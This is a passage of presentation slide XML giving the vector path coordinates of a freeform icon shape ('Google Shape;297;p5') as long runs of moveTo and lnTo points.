                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="7484"/>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297" name="Google Shape;297;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6823375" y="1978500"/>
              <a:ext cx="365025" cy="447525"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="14601" h="17901" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="10492" y="4329"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10859" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="4329"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6897" y="3448"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="3448"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6457" y="3118"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6237" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3118"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2789" y="3522"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2935" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="3522"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10639" y="7520"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11042" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="7520"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10272" y="8070"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10382" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="8070"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9135" y="4806"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9501" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9722" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9722" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9722" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="4806"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10492" y="9171"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10749" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="9171"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="551" y="7300"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="808" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="7300"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6897" y="8620"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6934" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9611"/>
